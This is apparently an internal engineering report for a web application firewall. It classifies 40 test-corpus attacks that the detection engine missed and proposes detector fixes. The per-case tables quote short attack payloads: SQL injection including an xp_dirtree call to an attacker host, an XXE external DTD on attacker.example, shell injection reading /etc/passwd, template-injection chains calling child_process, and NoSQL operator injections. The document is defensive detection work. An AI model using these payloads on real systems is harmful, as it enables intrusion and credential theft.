# Lane 2 blind spots, classified

`tests/lane2/` records that the semantic engine detects 127 of 170 corpus
attacks in shadow mode, and that **40 of the 43 misses are `blind`** — no
signal at all, from any detector, on any view. Not a threshold that was nearly
crossed; nothing was seen.

Until `v0.2.146` there was no way to say why. The three preprocessor-loop
budgets (`max_views_per_field`, `max_tokens_per_view`, `max_decode_rounds`)
narrowed what the lane looked at without setting `degraded` and without
incrementing anything, so "the payload was not inspected" and "the payload was
inspected and nothing matched" were the same observation. They now report
through `SemanticVerdict::degraded` and
`prxwaf_budget_events_total{subsystem="lane2_budget"}`, which makes the
question answerable — and the question has to be answered before anyone writes
a detector, because the remedy for a budget that ran out is a number in a
config file and the remedy for a detector that cannot see a shape is code.

**The answer is that none of the 40 is a budget miss.** Two of them touch a cap;
neither is caused by one. Every one of the 40 is a detection gap.

This document is the per-case evidence for that claim, the family roll-up, and
a fix list ordered by what it would recover.

> **Since this was measured (2026-07-30).** Fix 6 is done: `deser-009` is
> detected and the blind set is **39**, not 40 (shadow detection 128 of 170).
> The counts and tables below are the measurement as taken on `7357d9fd` and are
> deliberately left as recorded — the two places the change lands are annotated
> in place, in §3 and in §5.

---

## 1. How this was measured

Three runs of `tests/lane2/run.sh` in shadow mode on `7357d9fd`, plus a
per-case metrics probe. Everything ran against a private work directory and a
private port block so a concurrent harness could not be measured instead.

```bash
# baseline — reproduces baseline.json exactly
WORK=/tmp/prx-waf-lane2-blind OUT=/tmp/prx-waf-lane2-blind/reports \
WAF_PORT=17611 WAF_TLS_PORT=17644 API_PORT=17699 BACKEND_PORT=17688 \
PG_PORT=15577 PG_CONTAINER=prx-waf-lane2-blind-pg MODE=shadow KEEP=1 \
tests/lane2/run.sh
```

The two experiment runs reuse the config `run.sh` generated — which is itself
sliced out of `configs/default.toml`, so the shipped posture is what is being
perturbed — with the budget keys substituted and `[metrics]` enabled on
`127.0.0.1:19127`:

| run | change from the shipped posture |
|---|---|
| `probe-default` | metrics on. Nothing else. |
| `relaxed` | metrics on; **all ten** `[content_security.budget]` keys raised |
| `ast-only` | metrics on; `max_ast_attempts_per_request` 6 → 64, nothing else |

The `relaxed` values, all well past anything the corpus could demand:

```toml
max_fields_per_phase = 256                  # was 64
max_views_per_field = 64                    # was 12
max_ast_attempts_per_request = 64           # was 6
max_ast_input_bytes_total = 4194304         # was 262144
max_html_parse_attempts_per_request = 64    # was 6
max_html_parse_input_bytes_total = 4194304  # was 262144
max_tokens_per_view = 4096                  # was 512
max_preprocess_output_bytes_total = 8388608 # was 524288
max_field_input_bytes = 1048576             # was 16384
max_decode_rounds = 8                       # was 3
```

### Why a metrics scrape and not the `degraded` column

`classify.py` reads `degraded` out of `semantic_observations`. For a blind row
that column does not exist: `engine.rs` persists an observation only
`if !verdict.signals.is_empty()`, so a request that produced no signal writes
no row, and `any(r.get("degraded") for r in rows)` over an empty list is
`False` for **every one of the 40 rows this document is about**. The per-request
flag is structurally unavailable for exactly the population that needs it.

So each of the 40 was replayed **one at a time**, scraping
`prxwaf_budget_events_total` and `prxwaf_degraded_requests_total` before and
after, and the delta is that one request's budget footprint. The harness is
serial and single-client, so the attribution is exact here; it would not be
under concurrency.

---

## 2. The controlled experiment

**Raising every configurable Lane 2 budget recovers zero blind cases.**

| | shipped | all ten budgets raised |
|---|---|---|
| attacks detected | **127 / 170 (74.71%)** | **127 / 170 (74.71%)** |
| `blind` | **40** | **40** |
| benign flagged | 10 (4.55%) | 10 (4.55%) |
| benign **blocked** | 2 (0.91%) | **3 (1.36%)** |

The set difference is empty in both directions — not 40 different rows adding
up to the same total, the *same* 40 rows.

Exactly two cases changed anything at all, and neither is a blind case:

```
content-033  benign  fp-log   -> fp-block   score 41 -> 82
rce-017      attack  detected -> detected   score 41 -> 82
             rules: [rce.shell_exec_flag] -> [rce.shell_exec_flag, rce_ast.interp_exec_flag]
```

Both are the shell AST arriving to corroborate a structural hit that was
already there. The `ast-only` run reproduces that delta exactly, so
`max_ast_attempts_per_request = 6` is the single key that binds on this corpus,
and what it costs is not detection — it is one benign request moving from
"logged" to "blocked", which is the number that gates `rollout_bps`.

### The two cases that touch a cap

| case | event | degraded | still blind when relaxed? |
|---|---|---|---|
| `sqli-019` | `lane2_budget{limit="ast_attempts"}` ×1 | yes | **yes** |
| `ssti-013` | `lane2_detector{limit="input_cap"}` ×2 | no | **yes** |

`sqli-019` is the only blind row in the corpus that is genuinely degraded. The
relaxed run gives it every AST attempt it asks for and it stays blind, so the
exhausted budget cost it a parse that would have found nothing:
`1;EXEC master..xp_dirtree '\\attacker.com\share'--` does not parse in either
AST framing and no structural rule names `xp_dirtree`.

`ssti-013` hits `lane2_detector{limit="input_cap"}` — a *per-detector* input
ceiling (SQL AST 256 B, shell AST 2 KiB, XSS DOM 16 KiB), hard-coded, not part
of `[content_security.budget]`, and deliberately not a `degraded` signal
because the view is still scored by the other detectors. It fires identically
in the relaxed run, which is the proof that no config key reaches it.

---

## 3. The 40, one at a time

`class` is one of **detector gap** (no budget involvement), **rule default-off**
(a detector gap whose rule exists but ships disabled), **off-surface** (the
payload was never presented to a detector), or **corpus artefact**.

None of the 40 is classified "budget" and none is classified "both", because
the relaxed run recovered none of them.

Evidence marked *probe* comes from a hand-sent variant against a live WAF with
the shipped config; the score and firing rule are quoted from the
`semantic_observations` row it produced.

### sql_injection — 5 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `sqli-008` | `?id=1 ORDER BY 8--` column-count probe | no | – | detector gap | Parses cleanly as `select * from t where c = 1 order by 8--`; the AST classifier has arms for stacked / union / tautology / dangerous-fn / subquery and none for `ORDER BY`. No structural rule either. |
| `sqli-009` | form `username=admin'-- -` | no | – | detector gap | *probe*: blind as a body field **and** as a query parameter. Odd quote count: framing 1 (`c = admin'-- -`) and framing 2 (`c = 'admin'-- -'`) both fail to parse. |
| `sqli-013` | double-URL-encoded `1' OR 1=1` | no | – | detector gap | *probe*: the fully **decoded** payload `1' OR 1=1` is also blind (score 0), while `1' OR '1'='1` scores 88 via `ast.tautology`. The decode chain is not the problem — quote parity is. |
| `sqli-017` | JSON leaf `1) OR 1=1-- -` | no | – | detector gap | Same class as `sqli-013` with an unbalanced paren instead of an unbalanced quote; neither framing parses. |
| `sqli-019` | `1;EXEC master..xp_dirtree '\\attacker.com\share'--` | **yes** | `ast_attempts` | detector gap | *relaxed run*: budget event gone, still blind. `master..xp_dirtree` is not parseable and no structural rule covers `xp_`-prefixed procedures. *probe*: the stacked-comment control `1; DROP TABLE users--` scores 45. |

The shared root for `sqli-009` / `-013` / `-017` is one thing: **both AST
framings assume the injected fragment is quote- and paren-balanced.** A
breakout payload is unbalanced by construction — that is what "breakout" means.

### rce — 3 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `rce-002` | `?host=127.0.0.1 && id` | no | – | detector gap | `rce.cmd_sep_common` (conf 45) matches but ships default-off, and at the family's 0.5 detector weight it scores 22 against `log_threshold = 40` — enabling it alone would still not log. *probe*: `&& whoami` also blind; `;cat /etc/passwd` scores 70. |
| `rce-018` | `cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd` | no | – | detector gap | `shell_normalize` collapses `${IFS}` / `$IFS` / `$IFS$9` and nothing else. *probe*: the `${IFS}`-only sibling (`rce-011`) scores 68; adding the `${PATH:0:1}` slice takes it to 0. |
| `rce-019` | GNU tar `--checkpoint-action=exec=sh run.sh` | no | – | detector gap | *probe*: `--checkpoint-action=exec=sh -c id` scores 41 through `rce.shell_exec_flag`; the real payload has no `-c`, and no rule knows that `--checkpoint-action=exec=` is itself an exec primitive. |

### traversal — 2 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `trav-005` | `?file=../../../../../proc/self/environ` | no | – | rule default-off | `traversal.sensitive_abs_ops` (55) covers `/proc/self` and ships disabled. *probe*: the same traversal to `/etc/passwd` scores 68. |
| `trav-016` | `?template=../../../../app/config/database.yml` | no | – | rule default-off | No sensitive absolute path; only `traversal.plain_dotdot` (50, default-off) matches. |

### xss — 2 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `xss-004` | `?url=javascript:alert(1)` | no | – | detector gap | `XssDomDetector` gates on `looks_like_markup` — no tag open, no parse, no budget spent. *probe*: the same URI inside `<a href=…>` scores 43 via `xss.js_url`. A bare `javascript:` URI in a redirect parameter has no detector. |
| `xss-015` | `<img/src=x/onerror=alert(1)>` in `User-Agent` | no | – | **corpus artefact** | *probe*: `<img src=x onerror=alert(1)>` scores 43 and `<img/src="x"/onerror=alert(1)>` scores 43; only the corpus's unquoted form is blind. Per the HTML5 tokenizer an unquoted attribute value runs to whitespace or `>`, so `src` swallows `/onerror=alert(1)` and there is no event-handler attribute to find — in `html5ever` or in a browser. |

### xxe — 2 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `xxe-004` | `<!DOCTYPE r SYSTEM "http://attacker.example/x.dtd">` | no | – | rule default-off | `xxe.doctype_external` (60) ships disabled because a legitimate XHTML `PUBLIC` doctype matches it. *probe*: adding an internal `<!ENTITY … SYSTEM …>` subset takes the same body to 90. |
| `xxe-005` | billion laughs, three internal `<!ENTITY>` declarations | no | – | rule default-off | `xxe.entity_expansion` is `Count(3)` at conf 65 and ships disabled. The payload declares exactly three, so the count is met. |

### nosql_injection — 9 blind

Seven have their operator key surfaced as a leaf and lose only to a disabled
rule. Two never produce a leaf at all.

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `nosql-001` | `{"pw":{"$ne":null}}` | no | – | rule default-off | `nosql.comparison_operator` (55) default-off. *probe*: the same body with `$where` scores 90 at field `body.nosql.op`, so the operator-leaf path works. |
| `nosql-003` | `{"pw":{"$regex":"^.*"}}` | no | – | rule default-off | `nosql.regex_operator` (60) default-off. |
| `nosql-004` | `{"user":{"$gt":""}}` | no | – | rule default-off | `nosql.comparison_operator` (55) default-off. |
| `nosql-005` | `{"$or":[…]}` | no | – | rule default-off | `nosql.logical_operator` (45) default-off. |
| `nosql-006` | `{"$and":[{"$ne":…}]}` | no | – | rule default-off | Both matching rules default-off. |
| `nosql-007` | `{"$expr":{"$eq":[1,1]}}` | no | – | rule default-off | `nosql.expr_operator` (75) default-off. |
| `nosql-011` | `{"$regex":"^A","$options":"i"}` | no | – | rule default-off | `nosql.regex_operator` (60) default-off; `$options` is not in the extraction allowlist and does not need to be. |
| `nosql-009` | form `password[$ne]=x` | no | – | detector gap | *probe*: bracket notation carrying **`$where`** — the one default-on operator — is also blind. `extract_body_fields` parses multipart / JSON / GraphQL / XML and leaves `application/x-www-form-urlencoded` to the whole-body view, and the NoSQL rules are anchored (`^\$where$`) so they only ever match an isolated operator leaf. No leaf, no match, at any rule setting. |
| `nosql-010` | query `user[$ne]=admin` | no | – | detector gap | Same: query parameters are presented as one undivided `query` field, never as `name` / `value` pairs. |

### ssti — 10 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `ssti-001` | `{{7*7}}` | no | – | rule default-off | `ssti.jinja_arith_probe` (45) default-off. |
| `ssti-002` | `{{config}}` | no | – | detector gap | `ssti.jinja_sink` requires `config.items` inside the delimiter. *probe*: `{{config.items()}}` scores 88. Bare `{{config}}` is only reachable by `ssti.jinja_delim` (30), which is default-off **and** below `log_threshold = 40`. |
| `ssti-006` | Velocity `#set($x=$rt.getRuntime().exec("id"))` | no | – | rule default-off | `ssti.template_directive` (45) covers `#set(` and is default-off. No default-on rule pairs `getruntime` with `.exec(` outside a `{% %}` block. |
| `ssti-009` | Twig `{{_self.env.registerUndefinedFilterCallback("exec")}}` | no | – | detector gap | *probe*: the identical sink inside `{% … %}` scores 85 via `ssti.jinja_statement_sink`, whose alternation includes `_self.`. `ssti.jinja_sink`, the `{{ … }}` twin, does not list `_self.`. Same sink, two delimiters, one covered. |
| `ssti-010` | Smarty `{php}system('id');{/php}` | no | – | detector gap | No rule knows the `{php}` block. |
| `ssti-011` | SpEL in `X-Api-Version` | no | – | **off-surface** | `X-Api-Version` is not in `SEMANTIC_HEADERS`; the value is never presented to a detector. `classify.py` already names this row separately. |
| `ssti-012` | `{{''|attr('\x5f\x5fclass\x5f\x5f')}}` | no | – | detector gap | Hex-escaped dunder defeats every literal `__class__` / `__mro__` alternation, by design of the payload. |
| `ssti-013` | Handlebars `constructor` gadget, `require('child_process')` | no | `lane2_detector{input_cap}` ×2 | detector gap | Still blind in the relaxed run — the cap is per-detector and hard-coded. No rule covers the Handlebars gadget chain. |
| `ssti-014` | `{{request|attr(request.args.f)}}&f=__class__` | no | – | detector gap | The dunders arrive as `f=__class__`, without the leading dot `ssti.jinja_sink` requires and without any of the four sandbox dunders `ssti.py_sandbox_dunder` matches. |
| `ssti-015` | Pug/Nunjucks `#{…require('child_process').execSync('id')}` | no | – | detector gap | `ssti.hash_delim` (25) is default-off and below threshold; nothing matches `require(` or `execSync(`. |

### ldap_injection — 3 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `ldap-005` | `user=*&pw=*` | no | – | detector gap | Only `ldap.bare_wildcard` (20) matches. Default-off, and at conf 20 against `log_threshold = 40` it could not log even if enabled. |
| `ldap-007` | `user=admin*)((\|userPassword=*)` | no | – | detector gap | `ldap.filter_break_known_attr` needs `)` `(` `<known attr>` `=`; here a second `(` and a `\|` sit between. *probe*: even the simplified `admin*)(\|userPassword=*)` is blind, so it is the boolean-group open, not the doubled paren, that breaks the match. |
| `ldap-015` | query `a=*)(uid&b==*` | no | – | detector gap | The query is one field, so the text is present, but `)(uid` is followed by `&` rather than `=`. *probe*: `ldap-006`'s `*)(uid=*` scores 90. |

### xpath_injection — 1 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `xpath-013` | XQuery FLWOR `x' return //user/password] for $x in …` | no | – | detector gap | *probe*: the `'] or` shape scores 85 via `xpath.predicate_close_logic`. This payload closes the predicate and continues with `for`/`return` FLWOR syntax, which no rule models. |

### deserialization — 3 blind

| case | shape | degraded | cap hit | class | evidence |
|---|---|---|---|---|---|
| `deser-006` | `O:8:"stdClass":1:{…}` | no | – | rule default-off | `deser.php_object_injection` (60) default-off; `stdClass` is not in the gadget-class list the default-on rule requires. |
| `deser-015` | `a:2:{…O:4:"Evil":1:{…}}` | no | – | rule default-off | Same rule. *probe*: renaming the class to `Monolog` scores 88 via `deser.php_object_gadget`. |
| `deser-009` | base64 pickle, **protocol 4**, in a JSON string | no | – | detector gap — **fixed 2026-07-30** | *probe*: the same payload at **protocol 0** (`cos\nsystem…`, base64, same JSON field) scores 90 on the `blind_decoded` view. The base64 chain works; `deser.py_pickle_global_exec` only matches the protocol-0 `GLOBAL` opcode spelling, and protocol ≥ 2 uses `SHORT_BINUNICODE` + `STACK_GLOBAL`, which carries no `c`-prefixed module token. **Now detected** at confidence 92 by `deser.py_pickle_reduce_exec` — an opcode walker (`content_security/pickle.rs`), not a rule. The diagnosis above was right about the cause and wrong about the remedy: the analysis assumed the blind-decode chain would deliver the bytes, but the preprocessor's blind gate requires ≥ 85 % printable ASCII in the decoded form, which a protocol-4 pickle fails, so the walker decodes for itself. |

---

## 4. By family

| family | blind | budget-caused | recoverable by enabling an existing rule | needs new detection | not a detector question |
|---|---|---|---|---|---|
| `nosql_injection` | 9 | 0 | 7 | 2 | 0 |
| `ssti` | 10 | 0 | 2 | 7 | 1 (off-surface) |
| `sql_injection` | 5 | 0 | 0 | 5 | 0 |
| `ldap_injection` | 3 | 0 | 0 | 3 | 0 |
| `rce` | 3 | 0 | 0 | 3 | 0 |
| `deserialization` | 3 | 0 | 2 | 1 | 0 |
| `traversal` | 2 | 0 | 2 | 0 | 0 |
| `xss` | 2 | 0 | 0 | 1 | 1 (corpus artefact) |
| `xxe` | 2 | 0 | 2 | 0 | 0 |
| `xpath_injection` | 1 | 0 | 0 | 1 | 0 |
| **total** | **40** | **0** | **15** | **23** | **2** |

"Recoverable by enabling an existing rule" is **arithmetic, not measurement**:
the rule's confidence times its family's detector weight is compared against
that family's `log_threshold`. It is counted only where the rule's pattern
demonstrably matches the payload and the product clears the threshold — so
`ssti.jinja_delim` (30) and `ldap.bare_wildcard` (20) are excluded even though
they match, and `rce.cmd_sep_common` (45 × 0.5 weight = 22) is excluded for the
same reason.

It could not be measured when this was written, because **`default_on` was a
compile-time bool with no config surface**. `[content_security.attacks.*]` could
set thresholds, weights and a hard-veto allowlist, but there was no per-rule
enable key, so measuring the 15 needed either that key or a throwaway build.

> **Since measured (`v0.2.175` added `rules_enabled`).** All 15 are recovered,
> so the arithmetic held on the attack half — and it was silent about the two
> numbers that decide anything. Eleven of the 15 come from seven rules that flag
> nothing; the other four cost **five benign false positives** and take the FP
> column from 4.55% to 6.82%. And **not one of the 15 changes what gets
> blocked**: every recovered row scores its rule's confidence, 45 to 75, against
> a `block_threshold` of 80. See [lane2-rule-pricing.md](lane2-rule-pricing.md)
> for the per-rule table and the named benign rows.

---

## 5. Fix list

Ordered by cases recovered per unit of work. Every entry's FP cost is
unmeasured; `tests/lane2/` is the instrument that would price it, and no entry
below should land without a before/after run of both halves of the corpus.

### 1 — a per-rule enable key. 15 cases, one config surface

`nosql-001/003/004/005/006/007/011`, `ssti-001/006`, `trav-005/016`,
`xxe-004/005`, `deser-006/015`.

Every one of these is a rule that already exists, already has a confidence that
clears its threshold, and is switched off in a Rust literal. The work is not
detection work: add `rules_enabled` / `rules_disabled` to
`[content_security.attacks.*]`, thread it through `compile_table`, and the 15
become a measurement instead of an argument. That measurement is the whole
point — these rules are default-off because nobody has priced their FPs, and
this corpus is the price list.

Do this first even if the answer turns out to be "leave them off", because
today the question cannot be asked.

### 2 — NoSQL operators in form and query parameters. 2 cases, one extractor

`nosql-009`, `nosql-010`.

`extract_body_fields` handles multipart, JSON, GraphQL and XML, and drops
`application/x-www-form-urlencoded` on the floor; query parameters are never
split into name/value at all. The NoSQL rules are anchored to a whole leaf, so
bracket notation (`password[$ne]=x`) is invisible **at any rule setting** —
proved by probe with `$where`, which is default-on. Surfacing a
`name[$op]`-shaped parameter key as an operator leaf reuses the allowlist and
the existing detector.

Bounded and self-contained, and it compounds with item 1.

### 3 — a third SQL AST framing for unbalanced breakouts. up to 3 cases

`sqli-009`, `sqli-013`, `sqli-017`.

Both framings — `c = {s}` and `c = '{s}'` — need the fragment to be quote- and
paren-balanced, which a breakout payload never is. A framing that treats the
input's first quote as *closing* an already-open literal (`c = '` + `{s}`)
parses `1' OR 1=1` into the tautology the AST already knows how to classify.
`sqli-009` additionally needs a structural quote-then-comment rule; `sqli-017`
needs the same treatment for parens.

The FP surface is real and is already in the corpus: `benign-content.jsonl`
carries SQL in content fields. Measure before believing.

### 4 — `_self.` in `ssti.jinja_sink`. 1 case, one alternation

`ssti-009`.

`ssti.jinja_statement_sink` lists `_self.` and `ssti.jinja_sink` does not; the
same Twig sink is covered behind `{% %}` and uncovered behind `{{ }}`. Probed
both ways: 85 and 0. Cheapest single-case fix in this document, and it needs
its own FP check rather than a same-day edit — `_self.` inside `{{ }}` is a
Twig internal, rare in benign traffic, but "rare" is a claim this corpus can
test.

### 5 — a Node template-RCE rule. 2 cases, one rule

`ssti-013`, `ssti-015`.

`require('child_process')` and `.execSync(` appear in both, and in neither is
there anything else to match. One co-occurrence rule in the SSTI table covers
the Handlebars and the Pug/Nunjucks payloads. Note `ssti-013` also trips a
per-detector input cap, which no config change reaches — a rule that only
matches on the whole-view text would still see it.

### 6 — pickle protocol ≥ 2. 1 case, one careful rule — **DONE (2026-07-30)**

`deser-009`.

The blind-decode chain already delivers the decoded pickle (proved: the
protocol-0 payload scores 90 through exactly this path). Only the opcode
spelling differs. This is harder than it looks: protocol ≥ 2 framing bytes
become U+FFFD under `from_utf8_lossy`, so the rule has to match on the module
and callable tokens surviving around the replacement characters, and
`posix system` as a bare token pair is far noisier than `cos system`. Worth
doing, worth doing slowly.

**Done, and not as a rule.** `content_security/pickle.rs` walks the opcode
stream instead — protocols 0 through 5, `GLOBAL` / `STACK_GLOBAL` / `REDUCE` /
`INST` / `OBJ` / `NEWOBJ` / `NEWOBJ_EX` — and resolves the module/callable pair
against a closed table of execution primitives. `deser-009` scores 92 on
`deser.py_pickle_reduce_exec`; the benign corpus is unchanged at 10 FP / 2
block-FP, the same ten rows by name.

Two corrections to the paragraph above, both worth recording because both were
wrong in the same direction — they assumed the existing text machinery could be
made to reach the payload:

* **the blind-decode chain does not deliver this pickle.** `looks_structural`
  requires the decoded bytes to be ≥ 85 % printable ASCII before it will emit a
  `BlindDecoded` view, and a protocol-4 pickle is not. The protocol-0 probe
  passes that gate because protocol 0 is text; protocol 4 never would have. The
  walker decodes base64 (and hex) for itself, from `view.text`;
* **matching around the replacement characters was the wrong shape entirely.**
  `from_utf8_lossy` is lossy in both directions — distinct byte sequences
  collapse to the same `U+FFFD` — so a rule written against the lossy view could
  not have distinguished a real `STACK_GLOBAL` from any other non-UTF-8 filler.
  The bytes had to be read as bytes.

### 7 — LDAP filter-break widening. 2 cases, one pattern

`ldap-007`, `ldap-015`.

`ldap.filter_break_known_attr` requires `)` `(` `attr` `=` adjacently.
`ldap-007` puts a boolean-group open between them, `ldap-015` an `&`. Both are
small pattern widenings — and `ldap.filter_break_known_attr` is one of the two
rules responsible for the corpus's only two blocking false positives
(`content-099`). This one is last on the list for a reason: it is the family
with the least headroom.

### Not worth fixing

**`xss-015` — fix the corpus row, not the engine.** The payload
`<img/src=x/onerror=alert(1)>` has no `onerror` attribute: an unquoted HTML5
attribute value runs to whitespace or `>`, so `src` is `x/onerror=alert(1)`.
`html5ever` is right, a browser would agree, and the quoted variant the corpus
could have used scores 43. Any rule written to "catch" this row is a rule that
fires on a `src` value containing a slash. Quote the row or leave it as a
documented known-miss.

**`ssti-011` — a surface decision, not a detector defect.** The payload is in
`X-Api-Version`, outside `SEMANTIC_HEADERS`. Widening the header scope to every
header multiplies the per-request field count on all traffic to catch a header
name no framework reads; if the scope should grow, that is a budget-and-coverage
argument made against real traffic, not a fix for one corpus row.
`classify.py` already reports it separately for this reason.

**`ldap-005` (`user=*&pw=*`) — no rule can carry this.** The entire signal is a
`*` in two form fields. `ldap.bare_wildcard` exists, is default-off, and at
conf 20 cannot reach `log_threshold = 40` even switched on — which is the right
outcome. A rule that fires here fires on every wildcard search box.

**`rce-002` (`&& id`) — the design already answered this.** `rce.cmd_sep_common`
matches at 45, and RCE is a two-detector family at 0.5 weight, so it scores 22.
Raising the weight or the confidence to make one weak separator rule log on its
own discards the corroboration requirement that keeps `rce_ast.cmd_subst` from
blocking five documentation pages — see the FP breakdown in
`tests/lane2/README.md`.

**`sqli-008` (`ORDER BY 8--`) — it is a valid query.** Adding an `ORDER BY` arm
to the AST classifier means firing on every listing endpoint that takes a sort
column. The column-count probe is only distinguishable from a sort parameter by
rate, and rate is Lane 1's job.

**`ssti-012` / `ssti-014` — payloads built to have no literal to match.** One
hex-escapes the dunder, the other splits it across parameters so it arrives
without its leading dot. Catching them means matching `attr(` or a hex escape,
whose FP surface is any page of templating documentation. These are the `hard`
tier doing what the `hard` tier is for.

---

## 6. What this document does not establish

* **The 15 "recoverable by enabling an existing rule" were arithmetic** — and
  are no longer. As written, nothing had been flipped and re-measured, because
  there was no config key to flip; the number was confidence × weight vs
  `log_threshold` with the pattern checked by eye. Item 1 of the fix list has
  since landed and the sweep has run: all 15 recover, at a cost of five benign
  false positives and no change to any blocking decision
  ([lane2-rule-pricing.md](lane2-rule-pricing.md)). The rest of this list stands.
* **No FP cost in this document is measured except the budget one.** The only
  measured FP movement is `max_ast_attempts_per_request` 6 → 64 taking
  `content-033` from `fp-log` to `fp-block` (0.91% → 1.36% of the benign half).
* **The per-case budget attribution depends on a serial replay.** Scraping
  counters either side of one request is exact only because nothing else was in
  flight. The same method under load would attribute another request's
  exhaustion to whichever probe happened to bracket it.
* **`degraded` remains unreadable per-request for a blind row.** The metrics
  scrape is a workaround, not a fix: a request that produces no signal writes no
  observation, so the flag added in `v0.2.146` cannot be read back for exactly
  the population it was added to describe. Whether an observation should be
  persisted for a degraded-but-signal-free request is a real question and is
  deliberately not answered here.
* **Two `wrong-family`, one `sub-threshold` and two `misattributed` rows were
  not examined.** This document covers the 40 `blind` rows only; the other three
  misses have different causes and a different fix shape.
